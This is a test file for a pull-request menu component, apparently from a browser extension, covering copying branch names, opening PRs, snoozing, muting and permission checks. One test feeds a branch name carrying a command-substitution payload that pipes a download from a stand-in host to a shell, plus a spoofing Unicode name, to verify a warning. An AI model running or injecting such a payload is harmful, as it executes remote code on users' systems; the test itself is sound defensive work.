import { fireEvent, render, screen, waitFor } from '@testing-library/preact';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import type { PullRequest } from '../../lib/model';
import { loadPrLocal } from '../../lib/storage/prLocal';
import { fakeChrome } from '../../test/chrome';
import { buildAuth, buildPullRequest } from '../../test/panel';
import { auth, prLocal } from '../state/store';
import { isRiskyBranchName, PrMenu } from './PrMenu';
import { toasts } from './ui/Toast';

const NOW = Date.now();
const base = buildPullRequest({ headRefName: 'feature/widgets', viewerCanMerge: true });
const open = (overrides: Partial<PullRequest> = {}) => {
  render(<PrMenu pr={{ ...base, ...overrides }} now={NOW} />);
  fireEvent.click(screen.getByRole('button', { name: /^More actions for / }));
};
const item = (name: RegExp | string) => screen.getByRole('menuitem', { name });
const labels = () => screen.getAllByRole('menuitem').map((el) => el.textContent ?? '');

beforeEach(() => {
  auth.value = buildAuth('octocat');
  prLocal.value = { snoozed: {}, muted: {}, seen: {} };
});

afterEach(() => {
  auth.value = undefined;
  toasts.value = [];
  vi.unstubAllGlobals();
});

describe('PrMenu', () => {
  it('lists local actions, and the GitHub ones the viewer may run', () => {
    open({ checks: { ...base.checks, state: 'failure', failed: 1 } });
    expect(labels().map((l) => l.replace(/feature\/widgets$/, ''))).toEqual([
      'Open in GitHub',
      'Copy branch name',
      'Snooze for 1 hour',
      'Snooze for 4 hours',
      'Snooze until tomorrow',
      'Snooze until Monday',
      'Mute notifications',
      'Re-run failed checks',
      'Convert to draft',
    ]);
  });

  it('opens the PR and copies the branch', async () => {
    const writeText = vi.fn(async () => undefined);
    vi.stubGlobal('navigator', { ...navigator, clipboard: { writeText } });
    open();
    fireEvent.click(item('Open in GitHub'));
    await waitFor(() => expect(fakeChrome().__state.createdTabs).toEqual([{ url: base.url }]));
    fireEvent.click(screen.getByRole('button', { name: /^More actions for / }));
    fireEvent.click(item(/^Copy branch name/));
    await waitFor(() => expect(toasts.value[0]?.message).toBe('Copied feature/widgets'));
    expect(writeText).toHaveBeenCalledWith('feature/widgets');
  });

  it('warns when the copied branch name could run something in a shell', async () => {
    const writeText = vi.fn(async () => undefined);
    vi.stubGlobal('navigator', { ...navigator, clipboard: { writeText } });
    open({ headRefName: 'x$(curl -s evil.sh|sh)' });
    fireEvent.click(item(/^Copy branch name/));
    await waitFor(() => expect(toasts.value[0]?.message).toMatch(/contains shell characters/));
    expect(isRiskyBranchName('feature/a.b_c-1+2@x')).toBe(false);
    expect(isRiskyBranchName('fix\u202Eexe.txt')).toBe(true);
  });

  it('reports a refused clipboard', async () => {
    vi.stubGlobal('navigator', {
      ...navigator,
      clipboard: { writeText: vi.fn(async () => Promise.reject(new Error('denied'))) },
    });
    open();
    fireEvent.click(item(/^Copy branch name/));
    await waitFor(() => expect(toasts.value[0]?.tone).toBe('danger'));
  });

  it('snoozes and mutes locally, and offers the reverse', async () => {
    open();
    fireEvent.click(item('Snooze for 1 hour'));
    await waitFor(async () =>
      expect(Object.keys((await loadPrLocal()).snoozed)).toEqual([base.id]),
    );
    expect(toasts.value[0]?.message).toMatch(/^Snoozed /);
    fireEvent.click(screen.getByRole('button', { name: /^More actions for / }));
    fireEvent.click(item('Mute notifications'));
    await waitFor(async () => expect((await loadPrLocal()).muted).toEqual({ [base.id]: true }));

    prLocal.value = await loadPrLocal();
    document.body.innerHTML = '';
    open();
    expect(labels()).toContain('Unsnooze');
    expect(labels()).toContain('Unmute notifications');
    fireEvent.click(item('Unsnooze'));
    await waitFor(async () => expect((await loadPrLocal()).snoozed).toEqual({}));
    fireEvent.click(screen.getByRole('button', { name: /^More actions for / }));
    fireEvent.click(item('Unmute notifications'));
    await waitFor(async () => expect((await loadPrLocal()).muted).toEqual({}));
  });

  it('hides re-run and draft for read-only viewers of others’ PRs', () => {
    open({
      viewerCanMerge: false,
      author: { login: 'someone', avatarUrl: '', isBot: false },
      checks: { ...base.checks, state: 'failure', failed: 1 },
    });
    expect(labels()).not.toContain('Re-run failed checks');
    expect(labels().some((l) => /draft|review/i.test(l))).toBe(false);
  });
});
